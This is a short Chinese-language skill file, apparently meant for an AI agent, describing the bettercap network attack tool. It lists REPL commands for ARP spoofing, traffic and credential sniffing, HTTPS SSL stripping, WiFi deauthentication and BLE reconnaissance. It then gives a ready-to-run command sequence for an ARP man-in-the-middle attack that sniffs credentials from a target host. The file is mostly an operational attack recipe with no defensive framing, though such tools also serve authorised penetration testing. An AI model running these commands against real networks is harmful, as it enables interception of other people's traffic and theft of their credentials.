---
name: bettercap
description: >
  此技能适用于用户询问关于 "bettercap"、"执行 LAN 中间人攻击 (MITM)、WiFi 去认证/探测攻击、BLE 侦察"、"HTTPS SSL 剥离 (SSL stripping)" 等内容。集 WiFi、蓝牙、HID 和以太网网络攻击于一体的多功能工具，包括 ARP 欺骗、中间人攻击、流量嗅探和凭据窃取。
---

# Bettercap

网络攻击多功能工具：中间人攻击 (MITM)、嗅探、欺骗。

## 快速开始

```bash
sudo bettercap -iface eth0
sudo bettercap -iface eth0 -caplet http-ui
```

## 核心 REPL 命令

| 命令 | 用途 |
|---------|---------|
| `net.probe on` | 发现局域网主机 |
| `net.show` | 列出已发现的主机 |
| `arp.spoof on` | 启用 ARP 欺骗中间人攻击 |
| `set arp.spoof.targets <ip>` | 将中间人攻击限定到目标 |
| `net.sniff on` | 捕获凭据/流量 |
| `https.proxy on` | 启用 HTTPS 与 SSL 剥离 |
| `wifi.recon on` | WiFi AP/客户端发现 |
| `wifi.deauth <mac>` | 对客户端发送去认证包 |
| `ble.recon on` | BLE 设备扫描 |

## ARP 中间人攻击 + 凭据嗅探

```
sudo bettercap -iface eth0
net.probe on
set arp.spoof.duplex true
set arp.spoof.targets 192.168.1.50
arp.spoof on
net.sniff on
```

## 资源

| 文件 | 加载时机 |
|------|--------------|
| `references/` | Caplet 示例与模块参考 |
